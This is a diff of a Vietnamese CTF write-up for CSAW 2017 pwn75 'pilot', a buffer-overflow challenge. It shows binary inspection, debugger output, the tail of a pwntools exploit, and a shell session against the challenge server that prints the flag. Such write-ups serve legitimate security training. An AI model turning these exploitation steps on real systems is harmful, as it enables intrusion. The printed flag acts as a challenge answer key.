@@ -1,18 +1,17 @@
-+++
-date = "2017-09-20T23:48:01-04:00"
-title = "CSAW CTF Qualification 2017"
-Tags = ["ctf", "reverse engineering", "exploit development", "pwn"]
-Categories = ["CTF"]
-+++
+---
+title: "[CSAW CTF 17] pwn75: pilot"
+date: 2017-09-20T23:48:01-04:00
+Tags: ["ctf", "reverse engineering", "exploit development", "pwn", "csaw-ctf-17"]
+Categories: ["CTF"]
+---
 
 ![header](/img/csaw-ctf-qualification-2017/scoreboard.png)
 
 Năm nay mình có cơ hội chơi CSAW CTF một cách thực sự, với hy vọng team đủ khỏe để vào final North America lần nữa. Qua một năm được các tiền bối thông não ([quangltm](https://pwneris.me) và anh [tuanit96](http://www.hardtobelieve.me/)), mình đã quẩy được vài bài khá cơ bản.
 
-## Pwn 75 - Pilot
+Đây là bài đầu tiên mình owned trong giờ thi. Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:
 
-Bài này là một bài buffer overflow cơ bản. Đầu tiên mình xem thông tin file này:
-```bash
+```r
 ➜  pilot git:(master) ✗ file pilot
 pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
 ```
@@ -21,7 +20,7 @@ Như vậy đây là file ELF 64-bit đã bị stripped. Debug không thôi thì
 
 Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bảo vệ, còn mỗi Partial RELRO
 
-```bash
+```r
 ➜  pilot checksec pilot 
 [*] '/root/workspace/ctfs/2017/csaw/pwn/pilot/pilot'
     Arch:     amd64-64-little
@@ -34,7 +33,7 @@ Tiếp theo chạy checksec kiểm tra thì thấy binary tắt gần hết bả
 
 Chạy chương trình ra output như sau:
 
-```bash
+```r
 ➜  pilot git:(master) ✗ ./pilot
 [*]Welcome DropShip Pilot...
 [*]I am your assitant A.I....
@@ -47,7 +46,7 @@ Chạy chương trình ra output như sau:
 ```
 Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Nhưng chưa vội, mở binary lên bằng radare2 và xem các hàm nào...
 
-```bash
+```r
 ➜  pilot git:(master) ✗ r2 -A pilot                           
 [x] Analyze all flags starting with sym. and entry0 (aa)
 [x] Analyze len bytes of instructions for references (aar)
@@ -74,10 +73,11 @@ Rất có thể địa chỉ in ra kia là địa chỉ của input buffer. Như
 [0x004008b0]> 
 ```
 
-Nhìn có vẻ rất ghê vì binary đã bị stripped. Tuy nhiên mình tìm thấy tool này: [syms2elf](https://github.com/danigargu/syms2elf). Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Do bài này có cấu trúc khá đơn giản nên mình không cần dùng đến tool này vẫn làm được, nhưng nó có ích rất nhiều cho những bài phức tạp phía sau. Mình export binary ra bằng dòng lệnh `$syms2elf pilot_unstripped` và mở gdb lên debug trực tiếp luôn, 1 phần là cũng do lười :P
+Nhìn có vẻ rất ghê vì binary đã bị stripped. Trong một nỗ lực giảm bớt độ khó của việc debug, mình tìm thấy tool này: [syms2elf](https://github.com/danigargu/syms2elf). Tool này có thể dùng với radare2 hoặc IDA, có chức năng thêm lại symbol table vào binary đã bị stripped, giúp cho việc debug trong gdb đỡ thốn gấp vạn lần. Sau khi rename vài hàm quan trọng như main, mình export binary ra bằng dòng lệnh `$syms2elf pilot_unstripped`. Giờ thì mình đã có thể mở binary lên và debug như binary chưa bị stripped một cách thoải mái.
 
 Đặt breakpoint tại vị trí gọi hàm read trong main ở `0x00400ae0`:
-```bash
+
+```r
 pwndbg> r
 Starting program: /root/workspace/ctfs/2017/csaw/pwn/pilot/pilot_unstripped 
 [*]Welcome DropShip Pilot...
@@ -144,7 +144,7 @@ s.interactive()
 s.close()
 ```
 
-```bash
+```r
 ➜  pilot git:(master) ✗ python exploit.py 
 [+] Opening connection to pwn.chal.csaw.io on port 8464: Done
 Exploit?
@@ -159,10 +159,3 @@ $ cat flag
 flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
 $  
 ```
-## Pwn 100 - SCV
-
-## RE 100 - tablez
-
-## Forensics 200 - best_router
-
-## RE 400 - realism
